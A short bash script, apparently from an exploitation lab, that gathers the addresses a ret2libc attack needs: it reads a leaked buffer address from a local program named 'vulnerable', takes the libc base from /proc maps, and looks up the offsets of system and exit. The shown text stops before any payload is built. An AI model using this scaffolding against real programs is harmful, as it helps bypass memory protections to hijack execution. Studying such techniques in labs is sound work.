#!/usr/bin/env bash

print_pointer () {
	printf '%016x\n' $1
}

buffer_address=$(print_pointer $(echo | ./vulnerable | head -n1))
cat | ./vulnerable > /dev/null &
libc_base_address=$(print_pointer 0x$(grep libc- /proc/$(pidof vulnerable)/maps | head -n1 | cut -d'-' -f1))
kill $(pidof vulnerable)
libc_system=$(nm -D /usr/lib/libc.so.6 | grep "\<system\>" | cut -d' ' -f1)
libc_exit=$(nm -D /usr/lib/libc.so.6 | grep "\<exit\>" | cut -d' ' -f1)

if [[ $DEBUG ]]; then
	echo "Buffer address: $buffer_address"
	echo "Libc base address: $libc_base_address"
	echo "Libc system offset: $libc_system"
	echo "Libc exit offset: $libc_exit"
fi | column -t -s:
